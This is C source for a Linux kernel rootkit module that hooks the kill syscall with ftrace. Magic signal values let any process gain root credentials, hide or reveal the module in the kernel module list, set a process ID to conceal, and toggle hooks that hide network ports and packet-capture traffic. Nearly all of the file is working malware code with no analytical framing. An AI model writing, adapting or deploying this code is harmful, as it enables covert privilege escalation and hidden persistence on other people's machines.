#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include "ftrace_helper.h"
#include "kill_hijack.h"
#include "hide_files.h"
#include "port_hiding.h"
#include "hide_libpcap.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *);
void hide_module(void);
void set_root(void);
void showmodule(void);
void hide_module(void);
void set_pid(pid_t pid);


static bool hidden = false;
static bool hidden_network = true;
static struct list_head *prev_module;

asmlinkage int hook_kill(const struct pt_regs *regs)
{

    int sig = regs->si;

    if (sig == KILL_ROOT)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }
    if (sig == KILL_HIDE)
    {
        if (hidden)
        {
            printk(KERN_INFO "rootkit: showing...\n");
            show_module();
        }
        else
        {
            printk(KERN_INFO "rootkit: hiding...\n");
            hide_module();
        }
    }
    if (sig == KILL_SET_PID)
    {
        pid_t pid = regs->di;
        printk(KERN_INFO "rootkit: setting pid to %d\n", pid);
        set_pid(pid);
    }
    if (sig == KILL_HIDE_NETWORK)
    {
        if (hidden_network)
        {
            printk(KERN_INFO "rootkit: hiding network...\n");
            hidden_network = false;
            // uninstall hooks
            fh_remove_hooks(port_hooks, 1);
            fh_remove_hooks(libpcap_hooks, 3);
        }
        else
        {
            printk(KERN_INFO "rootkit: showing network...\n");
            hidden_network = true;
            // install hooks
            fh_install_hooks(port_hooks, 1);
            fh_install_hooks(libpcap_hooks, 3);
        }
    }

    return orig_kill(regs);
}

void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

void hide_module()
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = true;
}
void show_module()
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = false;
}
void set_pid(pid_t pid)
{
    sprintf(hide_pid, "%d", pid);
}

/* Declare the struct that ftrace needs to hook the syscall */
struct ftrace_hook kill_hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};